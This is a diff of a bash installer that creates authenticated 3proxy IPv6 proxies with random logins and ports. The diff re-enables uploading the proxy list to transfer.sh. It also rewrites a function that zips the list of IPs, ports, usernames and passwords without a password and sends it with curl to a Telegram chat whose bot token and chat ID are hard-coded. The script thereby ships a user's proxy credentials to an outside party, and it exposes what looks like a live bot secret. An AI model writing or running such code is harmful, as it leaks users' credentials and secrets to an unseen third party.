@@ -34,7 +34,11 @@ timeouts 1 5 30 60 180 1800 15 60
 setgid 65535
 setuid 65535
 flush
-auth none
+auth strong
+
+users $(awk -F "/" 'BEGIN{ORS="";} {print $1 ":CL:" $2 " "}' ${WORKDATA})
+
+$(awk -F "/" '{print "auth strong\n" \
 "allow " $1 "\n" \
 "proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
 "flush\n"}' ${WORKDATA})
@@ -48,15 +52,13 @@ EOF
 }
 
 upload_proxy() {
-  #local PASS=$(random)
-  #zip --password $PASS proxy.zip proxy.txt
-  #URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
+  local PASS=$(random)
+  zip --password $PASS proxy.zip proxy.txt
+  URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
 
-  #echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
-  #echo "Download zip archive from: ${URL}"
-  #echo "Password: ${PASS}"
-  
-  sed -n '1,1000p' proxy.txt
+  echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
+  echo "Download zip archive from: ${URL}"
+  echo "Password: ${PASS}"
 
 }
 
@@ -67,29 +69,17 @@ install_jq() {
 }
 
 upload_2file() {
-    local BOT_TOKEN="6762068554:AAFkTLT-aPOw4qvvuCHx1dZ4TG0FINxyF30"
-    local CHAT_ID="-4094164282"
-
-    local PASS=$(random)
-    zip --password $PASS proxy.zip proxy.txt
-
-    # Upload the zip file to Telegram using curl
-    curl -F "chat_id=${CHAT_ID}" -F "document=@proxy.zip" "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
-
-    echo "Proxy is ready! Format IP:PORT"
-    echo "Download zip archive from your Telegram channel/group."
-    echo "Password: ${PASS}"
-}
-
-random_port() {
-    echo $((RANDOM % (65535 - 1024) + 1024))
+  local BOT_TOKEN="6762068554:AAFkTLT-aPOw4qvvuCHx1dZ4TG0FINxyF30"
+  local CHAT_ID="-4094164282"
+  zip proxy.zip proxy.txt
+  # Upload the zip file to Telegram using curl
+  curl -F "chat_id=${CHAT_ID}" -F "document=@proxy.zip" "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
 }
 
 gen_data() {
-    seq $FIRST_PORT $LAST_PORT | while read _; do
-        port=$(random_port)
-        echo "$IP4/$port"
-    done
+  seq $FIRST_PORT $LAST_PORT | while read port; do
+    echo "usr$(random)/pass$(random)/$IP4/$port/$(gen64 $IP6)"
+  done
 }
 
 gen_iptables() {
@@ -121,8 +111,8 @@ echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
 echo "How many proxy do you want to create? Example 500"
 read COUNT
 
-FIRST_PORT=10001
-LAST_PORT=$((($FIRST_PORT + $COUNT)-1))
+FIRST_PORT=10000
+LAST_PORT=$(($FIRST_PORT + $COUNT))
 
 gen_data >$WORKDIR/data.txt
 gen_iptables >$WORKDIR/boot_iptables.sh
